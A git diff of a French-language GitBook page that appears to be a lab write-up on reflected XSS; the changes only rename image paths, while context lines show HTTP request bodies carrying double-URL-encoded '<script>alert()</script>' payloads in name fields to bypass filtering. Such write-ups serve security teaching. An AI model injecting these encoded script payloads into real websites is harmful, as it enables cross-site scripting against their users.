@@ -4,7 +4,7 @@
 
 L'affichage du prénom et du nom s'effectue ici de la même manière au sein d'une balise `<div></div>` :&#x20;
 
-![](<../../../../../.gitbook/assets/image (26).png>)
+![](<../../../../../.gitbook/assets/image (26) (1).png>)
 
 Dont voici la requête :&#x20;
 
@@ -68,7 +68,7 @@ Connection: close
 firstname=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2530%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e&lastname=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e&form=submit
 ```
 
-![](<../../../../../.gitbook/assets/image (22).png>)
+![](<../../../../../.gitbook/assets/image (22) (1).png>)
 
 ## Analyse du code source
 
@@ -153,4 +153,4 @@ Connection: close
 firstname=%253cscript%253ealert%280%29%253c%2Fscript%253e%26lastname%3D%253cscript%253ealert%281%29%253c%2Fscript%253e&lastname=%253cscript%253ealert%280%29%253c%2Fscript%253e%26lastname%3D%253cscript%253ealert%281%29%253c%2Fscript%253e&form=submit
 ```
 
-![](<../../../../../.gitbook/assets/image (24).png>)
+![](<../../../../../.gitbook/assets/image (24) (1).png>)
